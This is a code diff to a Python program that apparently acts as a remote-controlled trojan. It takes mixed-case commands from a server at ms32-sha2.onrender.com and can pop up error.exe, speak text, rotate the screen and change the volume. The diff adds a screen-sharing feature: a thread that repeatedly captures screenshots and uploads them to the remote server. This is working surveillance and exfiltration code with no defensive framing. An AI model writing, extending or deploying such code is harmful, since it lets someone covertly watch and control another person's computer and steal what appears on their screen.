@@ -9,11 +9,14 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 import rotatescreen as rs
+from pyautogui import screenshot
+from io import BytesIO 
 
 url = "https://ms32-sha2.onrender.com/"
 screen = rs.get_primary_display()
 terminate = False
 sstate = False
+sharing = False
 user = "03"
 try:
     pygame.mixer.init()
@@ -23,6 +26,7 @@ except:
         rq.post(url+"output",data={"user":user,"err":statement})
     except:
         pass
+              
 if not os.path.exists("effects"):
     os.mkdir("effects")
 if not os.path.exists("assets"):
@@ -72,7 +76,7 @@ def playfunc(fp):
         # try:                
         CoInitialize()
         devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        interface = devices.Activate(IAudioEndpointVolume.iid, CLSCTX_ALL, None)
         volume = interface.QueryInterface(IAudioEndpointVolume)
         
         if volume.GetMute():
@@ -302,8 +306,22 @@ def showerr(num):
             os.startfile("error.exe")
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
+
+def share():
+    global sharing
+    while sharing:
+        try:
+            ss = screenshot()
+            img_byte_arr = BytesIO()
+            ss.save(img_byte_arr, format='JPEG')
+            img_byte_arr = img_byte_arr.getvalue()
+            files = {'image': ('screenshot.jpg', img_byte_arr, 'image/jpeg')}
+            rq.post(url+"screenshot", files=files)
+        except Exception as e:
+            log(f"share thread error:\t{e}",state="WARN")
 def main():
     global sstate
+    global sharing
     log(f"{user} online!", state="ONLINE")
     while not terminate:
         try:
@@ -352,6 +370,11 @@ def main():
                 cmd = cmd.replace("eRr ","")
                 cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                 Thread(target=showerr,args=(cmd,)).start()
+            elif "sHaRe on" in cmd:
+                sharing = True
+                Thread(target=share).start()
+            elif "sHaRe off" in cmd:
+                sharing = False
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
